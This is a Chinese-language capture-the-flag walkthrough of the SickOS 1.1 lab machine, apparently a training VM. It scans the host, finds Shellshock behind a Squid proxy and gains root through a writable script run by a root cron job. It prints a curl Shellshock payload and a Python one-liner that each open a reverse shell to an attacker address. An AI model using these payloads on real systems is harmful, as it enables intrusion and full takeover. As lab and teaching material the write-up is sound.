### 主机发现和nmap扫描

```bash
nmap -sn 192.68.56.0/24
```

靶机ip：192.168.56.105

```bash
nmap -sT --min-rate 10000 192.168.56.105
```

```
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
```

```bash
nmap -sT -sV -sC -O -p22,3128,8080 192.168.56.105
```

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

### nikto扫描

```bash
nikto -h http://192.168.56.105 -useproxy http://192.168.56.105:3128
```

```
+ /cgi-bin/status: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
```

发现`shellshock`漏洞

> 漏洞产生原因：目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以`(){`开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

利用curl进行反弹shell

```bash
curl -v -x 192.168.56.105:3128 http://192.168.56.105/cgi-bin/status -H "User-Agent: () { :;};/bin/bash -i >& /dev/tcp/192.168.56.101/1235 0>&1"
```

### 系统立足点

```bash
www-data@SickOs:/var/www$ ls -la            
ls -la
total 28
drwxrwxrwx  3 root     root     4096 Jun  4 20:02 .
drwxr-xr-x 13 root     root     4096 Dec  6  2015 ..
-rw-------  1 www-data www-data 1493 Jun  6 02:01 .bash_history
-rwxrwxrwx  1 root     root      325 Jun  6 01:21 connect.py
-rw-r--r--  1 root     root       21 Dec  5  2015 index.php
-rw-r--r--  1 root     root       45 Dec  5  2015 robots.txt
drwxr-xr-x  5 root     root     4096 Dec  5  2015 wolfcms
www-data@SickOs:/var/www$ cat connect.py
cat connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

connect.py给的权限是777

### 定时任务提权

```bash
www-data@SickOs:/var/www$ cd /etc
cd /etc
www-data@SickOs:/etc$ ls -lah cron*
ls -lah cron*
-rw-r--r-- 1 root root  722 Jun 20  2012 crontab

cron.d:
total 20K
drwxr-xr-x  2 root root 4.0K Dec  5  2015 .
drwxr-xr-x 90 root root 4.0K Jun  6 00:51 ..
-rw-r--r--  1 root root  102 Jun 20  2012 .placeholder
-rw-r--r--  1 root root   52 Dec  5  2015 automate
-rw-r--r--  1 root root  544 Jul  2  2015 php5
```

查看`automate`文件

```bash
www-data@SickOs:/etc/cron.d$ cat automate
cat automate

* * * * * root /usr/bin/python /var/www/connect.py
```

以root身份执行了这个python脚本

追加反弹shell语句

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

拿到flag

```bash
root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

